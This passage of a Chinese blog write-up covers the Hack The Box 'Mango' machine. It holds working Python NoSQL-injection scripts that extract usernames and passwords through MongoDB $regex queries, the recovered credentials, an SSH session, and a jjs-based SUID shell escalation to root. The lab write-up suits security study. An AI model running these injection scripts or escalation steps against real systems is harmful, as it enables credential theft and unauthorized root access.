class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">def sendPayload(word):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username[$regex]&#x27;</span> : regex, <span class="string">&#x27;password[$ne]&#x27;</span> : <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">return</span> char</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>]:</span><br><span class="line">        username = ch</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            char = sendPayload(username)</span><br><span class="line">            <span class="keyword">if</span> char != None:</span><br><span class="line">                username += char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Username found: &#123;&#125;&quot;</span>.format(username)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>
+
+<p>脚本循环遍历有效字符并查找以a和m开头的用户名。</p>
+<p>包含302状态码(URL重定向)的HTTP响应包含一个有效字符，该脚本输出结果如下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username found: admin</span><br><span class="line">Username found: mango</span><br></pre></td></tr></table></figure>
+
+<p>标识了两个有效的用户名，admin和mango。可以尝试使用相同的逻辑来识别他们的密码。</p>
+<p>修改脚本如下所示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import printable</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">def sendPayload(user):</span><br><span class="line">    valid = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> printable:</span><br><span class="line">        regex = <span class="string">&#x27;&#123;&#125;.*&#x27;</span>.format(char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username&#x27;</span> : user, <span class="string">&#x27;password[$regex]&#x27;</span> : regex, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            valid.append(char)</span><br><span class="line">    <span class="built_in">return</span> valid</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>]:</span><br><span class="line">        valid = sendPayload(user)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Valid characters for &#123;&#125;: &#123;&#125;&quot;</span>.format(user, valid)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>
+
+<p>该脚本遍历所有可打印的ASCII字符。分别为两个用户返回有效的字符集，从而减少了下一阶段的请求数量。</p>
+<p>运行结果如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Valid characters <span class="keyword">for</span> admin: [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;|&#x27;</span>]</span><br><span class="line">Valid characters <span class="keyword">for</span> mango: [<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<h3 id="以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码"><a href="#以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码" class="headerlink" title="以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码"></a>以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码</h3><p>现在已经有了两个密码的字符集，更新脚本来查找密码。字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^，$，|，\\和.</span><br></pre></td></tr></table></figure>
+<p>应该用反斜杠进行转义，因为它们在正则表达式中具有特殊意义，并且可能导致错误的否定。</p>
+<p>依照之前爆破用户名脚本的方法修改脚本如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from requests import post</span><br><span class="line">from string import printable</span><br><span class="line">url = <span class="string">&#x27;http://staging-order.mango.htb/&#x27;</span></span><br><span class="line">admin_pass = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\$&#x27;</span>, <span class="string">&#x27;\\.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\^&#x27;</span>, <span class="string">&#x27;\\|&#x27;</span>]</span><br><span class="line">mango_pass = [<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;\\$&#x27;</span>, <span class="string">&#x27;\\.&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\\^&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\\|&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">def sendPayload(user, word):</span><br><span class="line">    valid = admin_pass <span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">else</span> mango_pass</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> valid:</span><br><span class="line">        regex = <span class="string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)</span><br><span class="line">        data = &#123; <span class="string">&#x27;username&#x27;</span> : user, <span class="string">&#x27;password[$regex]&#x27;</span> : regex, <span class="string">&#x27;login&#x27;</span> : <span class="string">&#x27;login&#x27;</span> &#125;</span><br><span class="line">        response = post(url, data = data, allow_redirects=False)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == 302:</span><br><span class="line">            <span class="built_in">return</span> char</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">def getUser():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;mango&#x27;</span>]:</span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            char = sendPayload(user, password)</span><br><span class="line">            <span class="keyword">if</span> char != None:</span><br><span class="line">                password += char</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Password for &#123;&#125; found: &#123;&#125;&quot;</span>.format(user, password)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getUser()</span><br></pre></td></tr></table></figure>
+
+<p>该脚本对两个用户都使用有效的字符集，并逐个字符地显示他们的密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Password <span class="keyword">for</span> admin found: t9KcS3&gt;!0B<span class="comment">#2</span></span><br><span class="line">Password <span class="keyword">for</span> mango found: h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure>
+
+<p>两个用户的密码都被成功地获取了。用户mango的凭证可以用来通过SSH登录。</p>
+<h3 id="getshell-amp-提权"><a href="#getshell-amp-提权" class="headerlink" title="getshell &amp; 提权"></a>getshell &amp; 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Connecting to 10.10.10.162:22...</span><br><span class="line">Connection established.</span><br><span class="line">To escape to <span class="built_in">local</span> shell, press <span class="string">&#x27;Ctrl+Alt+]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Tue Apr 21 05:18:56 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.08               Processes:            99</span><br><span class="line">  Usage of /:   25.8% of 19.56GB   Users logged <span class="keyword">in</span>:      0</span><br><span class="line">  Memory usage: 14%                IP address <span class="keyword">for</span> ens33: 10.10.10.162</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">122 packages can be updated.</span><br><span class="line">18 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138</span><br><span class="line">/usr/bin/xauth:  file /home/mango/.Xauthority does not exist</span><br><span class="line">mango@mango:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(mango) gid=1000(mango) <span class="built_in">groups</span>=1000(mango)</span><br><span class="line">mango@mango:~$ <span class="built_in">whoami</span></span><br><span class="line">mango</span><br><span class="line">mango@mango:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> mango: </span><br><span class="line">Sorry, user mango may not run sudo on mango.</span><br></pre></td></tr></table></figure>
+
+<p>找到user.txt但是用户权限不足</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:/home$ <span class="built_in">cd</span> admin</span><br><span class="line">mango@mango:/home/admin$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">mango@mango:/home/admin$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span>: user.txt: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>切换用户，获取user</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:/home/admin$ su admin</span><br><span class="line">Password: </span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=4000000000(admin) gid=1001(admin) <span class="built_in">groups</span>=1001(admin)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">admin</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">$ <span class="built_in">cat</span> user.txt</span><br><span class="line">79bf31c6c6eb38a8567832f7f8b47e92</span><br></pre></td></tr></table></figure>
+
+<p>下面就是提权步骤了</p>
+<p>搜索SUID文件会发现两个不常见的二进制文件，run-mailcap和jjs。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/snap/core/7713/bin/mount</span><br><span class="line">/snap/core/7713/bin/ping</span><br><span class="line">/snap/core/7713/bin/ping6</span><br><span class="line">/snap/core/7713/bin/su</span><br><span class="line">/snap/core/7713/bin/umount</span><br><span class="line">/snap/core/7713/usr/bin/chfn</span><br><span class="line">/snap/core/7713/usr/bin/chsh</span><br><span class="line">/snap/core/7713/usr/bin/gpasswd</span><br><span class="line">/snap/core/7713/usr/bin/newgrp</span><br><span class="line">/snap/core/7713/usr/bin/passwd</span><br><span class="line">/snap/core/7713/usr/bin/sudo</span><br><span class="line">/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/7713/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/7713/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/7713/usr/sbin/pppd</span><br><span class="line">/snap/core/6350/bin/mount</span><br><span class="line">/snap/core/6350/bin/ping</span><br><span class="line">/snap/core/6350/bin/ping6</span><br><span class="line">/snap/core/6350/bin/su</span><br><span class="line">/snap/core/6350/bin/umount</span><br><span class="line">/snap/core/6350/usr/bin/chfn</span><br><span class="line">/snap/core/6350/usr/bin/chsh</span><br><span class="line">/snap/core/6350/usr/bin/gpasswd</span><br><span class="line">/snap/core/6350/usr/bin/newgrp</span><br><span class="line">/snap/core/6350/usr/bin/passwd</span><br><span class="line">/snap/core/6350/usr/bin/sudo</span><br><span class="line">/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/6350/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/6350/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/6350/usr/sbin/pppd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/run-mailcap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>
+
+<p>参考GTFOBins</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcnVuLW1haWxjYXAv">run-mailcap<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvampzLw==">jjs<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>使用Java的Runtime.Exec()函数生成一个shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; Java.<span class="built_in">type</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">&#x27;cp /bin/sh /tmp/sh&#x27;</span>).waitFor()</span><br><span class="line">0</span><br><span class="line">jjs&gt; Java.<span class="built_in">type</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">&#x27;chmod u+s /tmp/sh&#x27;</span>).waitFor()</span><br><span class="line">0</span><br><span class="line">jjs&gt; </span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">hsperfdata_root     systemd-private-daa6581d1d8b4f4ca498d538b165beb7-apache2.service-TSRSE0</span><br><span class="line">mongodb-27017.sock  systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-resolved.service-VipHFk</span><br><span class="line">sh		    systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-timesyncd.service-1Ap17W</span><br><span class="line">$ ./sh -p</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=4000000000(admin) gid=1001(admin) euid=0(root) <span class="built_in">groups</span>=1001(admin)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">8a8ef79a7a2fbb01ea81688424e9ab15</span><br></pre></td></tr></table></figure>
+
+<p>成功的获取了root权限并取得了flag</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb22.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb23.jpg"></p>
+</li>
+</ul>
+<p><font color="red">知识点总结：</font></p>
+<ul>
+<li>向php请求参数添加[],使用弱比较绕过身份验证</li>
+<li>NoSQL注入攻击，$ne注入</li>
+<li>MongoDB注入</li>
+<li>正则匹配fuzz查询用户名以及密码</li>
+<li>编写python fuzz脚本根据302，200返回页面判断参数是否存在</li>
+<li>GTFOBins jjs 使用Java的Runtime.Exec()函数生成一个shell</li>
+<li>chmod u+s &#x2F;tmp&#x2F;sh更改shell权限，并使用-p参数提升为root权限</li>
+</ul>
+<p><font color="red">Game over</font></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/04/20/mango/" title="Hack-The-Box-walkthrough[mango]">https://fdlucifer.github.io/2020/04/20/mango/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/04/17/vulnos-2/" rel="prev" title="vulnhub靶机渗透[vulnos-2]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[vulnos-2]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/04/21/Traverxec/" rel="next" title="Hack-The-Box-walkthrough[Traverxec]">
+                  Hack-The-Box-walkthrough[Traverxec] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
